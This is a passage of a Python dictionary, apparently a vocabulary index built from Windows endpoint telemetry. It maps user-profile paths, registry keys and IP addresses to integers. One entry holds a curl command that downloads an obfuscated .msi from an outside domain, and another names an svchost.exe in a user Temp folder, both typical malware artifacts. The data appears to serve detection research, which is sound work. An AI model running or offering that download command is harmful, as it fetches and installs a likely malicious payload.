       " 'C:\\\\Users\\\\jennifertaylor\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\scripts\\\\powershell\\\\active-directory\\\\.git': 291,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\settings\\\\main\\\\ms-language-packs\\\\browser': 292,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds Cache\\\\.git': 293,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\IndexedDB\\\\https_tw.yahoo.com_0.indexeddb.blob\\\\.git': 294,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\353698': 295,\n",
       " 'C:\\\\Users\\\\elizabethgoodman\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ZuneMusic_8wekyb3d8bbwe\\\\AC\\\\Temp': 296,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\LocalCache\\\\Local\\\\Microsoft': 297,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\\\\AC\\\\*': 298,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Packages\\\\E2A4F912-2574-4A75-9BB0-0D023378592B_cw5n1h2txyewy\\\\AC\\\\INetCookies\\\\.git': 299,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\BackgroundTransferApi': 300,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\he': 301,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\gfdkimpbcpahaombhbimeihdjnejgicl\\\\def\\\\Code Cache\\\\*': 302,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\tr\\\\*': 303,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCamera_8wekyb3d8bbwe\\\\AC\\\\*': 304,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\BackgroundTransferApi\\\\*': 305,\n",
       " 'C:\\\\Users\\\\david67': 306,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecHealthUI_cw5n1h2txyewy\\\\AC\\\\INetCache': 307,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Office.OneNote_8wekyb3d8bbwe\\\\AC\\\\*': 308,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aohghmighlieiainnegkcijnfilokake\\\\0.10_0\\\\_locales\\\\sv': 309,\n",
       " 'C:\\\\Users\\\\kathrynhall\\\\Pictures\\\\Saved Pictures\\\\.git': 310,\n",
       " 'C:\\\\Users\\\\xmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\TempState': 311,\n",
       " 'C:\\\\Users\\\\jacobsmith\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\images\\\\*': 312,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\zh_TW\\\\.git': 313,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ECApp_8wekyb3d8bbwe\\\\*': 314,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\AC': 315,\n",
       " 'C:\\\\Users\\\\alisonhaynes\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\it': 316,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\Internet Explorer\\\\DOMStore\\\\J15GVKBA': 317,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\AppCompatFlags\\\\Layers\\\\C:\\\\Users\\\\jensenderek\\\\AppData\\\\Local\\\\Temp\\\\svchost.exe': 318,\n",
       " 'C:\\\\Users\\\\dkelly\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.SecureAssessmentBrowser_cw5n1h2txyewy\\\\SystemAppData\\\\*': 319,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sr-Latn-RS': 320,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\LocalState': 321,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\*': 322,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\be\\\\*': 323,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 324,\n",
       " 'C:\\\\Users\\\\adamslydia\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\TokenBroker\\\\*': 325,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\zh_TW': 326,\n",
       " 'C:\\\\Users\\\\ricky35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Wallet_8wekyb3d8bbwe\\\\LocalCache\\\\*': 327,\n",
       " 'C:\\\\Users\\\\harristheresa\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftSolitaireCollection_8wekyb3d8bbwe\\\\AppData\\\\*': 328,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\templates\\\\azure\\\\CEF-Log-Analytics-Agent\\\\scripts\\\\*': 329,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\zh_HK\\\\*': 330,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\AutofillStrikeDatabase\\\\.git': 331,\n",
       " 'C:\\\\Users\\\\evansdaniel\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe\\\\AC\\\\INetCache\\\\*': 332,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Roaming\\\\Microsoft\\\\Protect\\\\*': 333,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Recent\\\\CustomDestinations': 334,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\AC\\\\INetCache': 335,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\ListSync\\\\.git': 336,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\pl-PL\\\\*': 337,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ShellFeeds\\\\.git': 338,\n",
       " 'C:\\\\Users\\\\townsendsylvia\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\datareporting\\\\glean\\\\events': 339,\n",
       " 'C:\\\\Users\\\\michaelstone\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.GetHelp_8wekyb3d8bbwe\\\\RoamingState': 340,\n",
       " 'C:\\\\Users\\\\angela76\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ig-NG\\\\*': 341,\n",
       " 'C:\\\\Users\\\\hmarsh\\\\AppData\\\\Local\\\\Comms\\\\Unistore\\\\.git': 342,\n",
       " '152.199.5.13': 343,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\*': 344,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.BioEnrollment_cw5n1h2txyewy\\\\SystemAppData': 345,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\LocalState': 346,\n",
       " 'C:\\\\Users\\\\sanchezmatthew\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\99.0.1150.46\\\\Default': 347,\n",
       " 'C:\\\\Users\\\\brucegriffin\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\IndexedDB\\\\https_ntp.msn.com_0.indexeddb.leveldb\\\\*': 348,\n",
       " 'C:\\\\Users\\\\john95\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.UndockedDevKit_cw5n1h2txyewy\\\\LocalCache': 349,\n",
       " 'C:\\\\Users\\\\wgibson\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\az-Latn-AZ': 350,\n",
       " 'C:\\\\Users\\\\perezrodney\\\\AppData\\\\Local\\\\Microsoft\\\\TokenBroker\\\\Cache\\\\*': 351,\n",
       " 'C:\\\\Users\\\\jorgeterry\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGameCallableUI_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\*': 352,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.HEIFImageExtension_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 353,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\adm\\\\sv\\\\*': 354,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Apps_{98de8edc-74de-4f3b-a702-e9c35c538fda}\\\\.git': 355,\n",
       " 'C:\\\\Users\\\\julie68\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\Code Cache\\\\js\\\\index-dir\\\\*': 356,\n",
       " 'C:\\\\Users\\\\andersonluis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\pjkljhegncpnkpknbcohdijeoejaedia\\\\8.3_0\\\\_locales\\\\se': 357,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\es': 358,\n",
       " 'smona132175062315590385642': 359,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\AC\\\\INetCookies': 360,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Sync Data\\\\LevelDB\\\\*': 361,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Snapshots\\\\*': 362,\n",
       " 'C:\\\\Windows\\\\System32\\\\Curl.exe -k http://enlacelaboral.com/3cKldxdt/AhIaKCwxEn8qPXsYQn12eWR6endleGV9fQ== -o 27bf5ef8.msi': 363,\n",
       " 'C:\\\\Users\\\\lanealbert\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.SkypeApp_kzf8qxf38zg5c\\\\AC\\\\*': 364,\n",
       " 'C:\\\\Users\\\\evan17\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CallingShellApp_cw5n1h2txyewy\\\\AppData\\\\.git': 365,\n",
       " 'C:\\\\Users\\\\nolandennis\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\da\\\\*': 366,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\ActiveSync\\\\.git': 367,\n",
       " 'C:\\\\Users\\\\anthonysheila\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-TT\\\\.git': 368,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.XGpuEjectDialog_cw5n1h2txyewy\\\\LocalState\\\\.git': 369,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\Microsoft\\\\Internet Explorer\\\\DOMStore\\\\2ZK7K4M1\\\\*': 370,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_metadata\\\\.git': 371,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MixedReality.Portal_8wekyb3d8bbwe\\\\SystemAppData\\\\.git': 372,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\az-Latn-AZ': 373,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ca\\\\.git': 374,\n",
       " 'C:\\\\Users\\\\garypetty\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\nl': 375,\n",
       " 'C:\\\\Users\\\\jessicajacobson\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\en-AU\\\\*': 376,\n",
       " 'C:\\\\Users\\\\gfields\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\\\\LocalCache\\\\.git': 377,\n",
       " 'C:\\\\Users\\\\ngray\\\\AppData\\\\Local\\\\Packages\\\\Windows.CBSPreview_cw5n1h2txyewy\\\\AC\\\\INetHistory\\\\*': 378,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Photos_8wekyb3d8bbwe\\\\LocalCache\\\\.git': 379,\n",
       " 'C:\\\\Users\\\\wayneanderson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.ScreenSketch_8wekyb3d8bbwe': 380,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\microsoft.windowscommunicationsapps_8wekyb3d8bbwe\\\\AC\\\\INetHistory\\\\*': 381,\n",
       " 'C:\\\\Users\\\\sarahchandler\\\\AppData\\\\Local\\\\Mozilla\\\\*': 382,\n",
       " 'C:\\\\Users\\\\ohall\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\fr_CA\\\\.git': 383,\n",
       " 'C:\\\\Users\\\\bakerrenee\\\\Desktop\\\\.git': 384,\n",
       " 'C:\\\\Users\\\\leahbrown\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\ghbmnnjooekpmoecnnnilnnbdlolhkhi\\\\1.41.0_0\\\\_locales\\\\my\\\\.git': 385,\n",
       " 'C:\\\\Users\\\\benjamin99\\\\Downloads\\\\GoToAssist.exe:Zone.Identifier': 386,\n",
       " 'C:\\\\Users\\\\bmoore\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy': 387,\n",
       " 'C:\\\\Users\\\\bmoore\\\\Desktop\\\\Blacksmith-master\\\\Blacksmith-master\\\\resources\\\\configs\\\\syslog': 388,\n",
       " 'C:\\\\Users\\\\nicholas37\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\ms\\\\.git': 389,\n",
       " 'C:\\\\Users\\\\victoriacole\\\\AppData\\\\Local\\\\Microsoft\\\\Feeds Cache': 390,\n",
       " 'C:\\\\Users\\\\scooper\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\logs\\\\Personal\\\\FeedbackHub': 391,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Microsoft\\\\Windows\\\\Safety\\\\edge\\\\local\\\\local': 392,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\Local\\\\Mozilla\\\\Firefox\\\\Profiles\\\\wfxwaomf.default-release\\\\.git': 393,\n",
       " 'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Explorer\\\\FolderDescriptions\\\\{5CE4A5E9-E4EB-479D-B89F-130C02886155}\\\\LocalizedName': 394,\n",
       " 'C:\\\\Users\\\\pwebb\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-AE': 395,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\\\\Settings\\\\*': 396,\n",
       " 'C:\\\\Users\\\\larry44\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Snapshots\\\\94.0.992.47\\\\Default\\\\AutofillStrikeDatabase\\\\.git': 397,\n",
       " 'C:\\\\Users\\\\riveragregg\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Storage\\\\ext\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\def\\\\Session Storage\\\\.git': 398,\n",
       " 'C:\\\\Users\\\\crosschristine\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.NarratorQuickStart_8wekyb3d8bbwe\\\\AC\\\\INetCookies\\\\.git': 399,\n",
       " 'C:\\\\Users\\\\wendyroberts\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.AsyncTextService_8wekyb3d8bbwe\\\\TempState\\\\*': 400,\n",
       " 'C:\\\\Users\\\\wchapman\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\*': 401,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\\\\LocalCache': 402,\n",
       " 'C:\\\\Users\\\\richard97\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.NET.Native.Runtime.2.2_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 403,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.OOBENetworkConnectionFlow_cw5n1h2txyewy\\\\TempState\\\\.git': 404,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Packages\\\\1527c705-839a-4832-9118-54d4Bd6a0c89_cw5n1h2txyewy\\\\LocalState': 405,\n",
       " 'C:\\\\Users\\\\psimmons\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.StorePurchaseApp_8wekyb3d8bbwe\\\\AC\\\\.git': 406,\n",
       " 'C:\\\\Users\\\\amberhernandez\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\pt_PT\\\\.git': 407,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.CloudExperienceHost_cw5n1h2txyewy\\\\LocalCache\\\\*': 408,\n",
       " 'C:\\\\Users\\\\priscillaroberson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\felcaaldnbdncclmgdcncolpebgiejap\\\\1.2_0\\\\_locales\\\\fr\\\\*': 409,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\sv-SE': 410,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Wallet_8wekyb3d8bbwe\\\\AC\\\\INetHistory': 411,\n",
       " 'C:\\\\Users\\\\david67\\\\AppData\\\\LocalLow\\\\Microsoft\\\\Internet Explorer\\\\EdpDomStore\\\\.git': 412,\n",
       " 'C:\\\\Users\\\\david75\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AC\\\\Temp': 413,\n",
       " 'C:\\\\Users\\\\griffithjohn\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MSPaint_8wekyb3d8bbwe\\\\LocalState\\\\*': 414,\n",
       " 'C:\\\\Users\\\\ijohnson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftOfficeHub_8wekyb3d8bbwe': 415,\n",
       " 'C:\\\\Users\\\\vbuckley\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.XboxGamingOverlay_8wekyb3d8bbwe\\\\LocalState\\\\Logs\\\\.git': 416,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\Favicons\\\\*': 417,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\pnacl\\\\*': 418,\n",
       " 'C:\\\\Users\\\\steven78\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC\\\\Temp\\\\.git': 419,\n",
       " 'C:\\\\Users\\\\heatherhoward\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WebMediaExtensions_8wekyb3d8bbwe\\\\LocalState': 420,\n",
       " 'C:\\\\Users\\\\brian88\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\AC\\\\INetHistory': 421,\n",
       " 'C:\\\\Users\\\\nicholas35\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.VP9VideoExtensions_8wekyb3d8bbwe\\\\RoamingState': 422,\n",
       " 'C:\\\\Users\\\\amanda90\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.MicrosoftEdge.Stable_8wekyb3d8bbwe\\\\AppData': 423,\n",
       " 'C:\\\\Users\\\\melindapatterson\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.Search_cw5n1h2txyewy\\\\LocalState\\\\ConstraintIndex\\\\Settings_{f6d48b37-97d2-4998-9557-38e97993d384}': 424,\n",
       " 'C:\\\\Users\\\\stephaniewood\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\ar-QA\\\\.git': 425,\n",
       " 'C:\\\\Users\\\\james97\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\apdfllckaahabafndbhieahigkjlhalf\\\\14.5_0\\\\_locales\\\\bg': 426,\n",
       " 'C:\\\\Users\\\\meganmaldonado\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\OptimizationGuidePredictionModels\\\\OPTIMIZATION_TARGET_LANGUAGE_DETECTION_2203162232\\\\*': 427,\n",
       " 'C:\\\\Users\\\\natalie04\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\pl-PL': 428,\n",
       " 'C:\\\\Users\\\\jennifertaylor\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\ContentManagementSDK\\\\Creatives\\\\338388': 429,\n",
       " 'C:\\\\Users\\\\kyle74\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\nmmhkkegccagdldgiimedpiccmgmieda\\\\1.0.0.6_0\\\\_locales\\\\bg\\\\*': 430,\n",
       " 'C:\\\\Users\\\\jacob97\\\\AppData\\\\Local\\\\Microsoft\\\\Edge\\\\User Data\\\\Default\\\\IndexedDB\\\\https_ntp.msn.com_0.indexeddb.leveldb\\\\.git': 431,\n",
       " 'C:\\\\Users\\\\kimberlyalexander\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.ContentDeliveryManager_cw5n1h2txyewy\\\\LocalState\\\\TargetedContentCache\\\\v3\\\\314559\\\\*': 432,\n",
       " 'C:\\\\Users\\\\nsilva\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.AssignedAccessLockApp_cw5n1h2txyewy\\\\AC\\\\*': 433,\n",
       " '23.1.236.18': 434,\n",
       " 'C:\\\\Users\\\\angela76\\\\Desktop\\\\Sysmon\\\\.git': 435,\n",
       " 'C:\\\\Users\\\\christopher63\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-PE\\\\*': 436,\n",
       " 'C:\\\\Users\\\\skoch\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsCalculator_8wekyb3d8bbwe\\\\AC\\\\INetHistory': 437,\n",
       " 'C:\\\\Users\\\\nholt\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.WindowsStore_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\CryptnetUrlCache\\\\MetaData\\\\.git': 438,\n",
       " 'C:\\\\Users\\\\amy04\\\\AppData\\\\Local\\\\Microsoft\\\\input\\\\es-HN\\\\.git': 439,\n",
       " 'C:\\\\Users\\\\meaganaustin\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\blpcfgokakmgnkcojhhkbfbldkacnbeo\\\\4.2.8_0\\\\_locales\\\\es\\\\.git': 440,\n",
       " 'C:\\\\Users\\\\lopezmonica\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.Windows.PeopleExperienceHost_cw5n1h2txyewy\\\\AC\\\\*': 441,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.YourPhone_8wekyb3d8bbwe\\\\AC\\\\Microsoft\\\\CryptnetUrlCache': 442,\n",
       " 'C:\\\\Users\\\\desireesantana\\\\AppData\\\\Local\\\\Packages\\\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\\\AC\\\\INetHistory': 443,\n",
       " 'C:\\\\Users\\\\wthornton\\\\AppData\\\\Local\\\\Microsoft\\\\WindowsApps\\\\Microsoft.DesktopAppInstaller_8wekyb3d8bbwe': 444,\n",
       " 'C:\\\\Users\\\\omcfarland\\\\AppData\\\\Local\\\\Microsoft\\\\OneDrive\\\\22.055.0313.0001\\\\ur\\\\*': 445,\n",
       " 'C:\\\\Users\\\\davidsmith\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Extensions\\\\aapocclcgogkmnckokdopfmhonfmgoek\\\\0.10_0\\\\_locales\\\\pt_PT': 446,\n",
       " 'C:\\\\Users\\\\chadhicks\\\\AppData\\\\Local\\\\Packages\\\\Microsoft.CredDialogHost_cw5n1h2txyewy\\\\AC\\\\Temp\\\\.git': 447,\n",
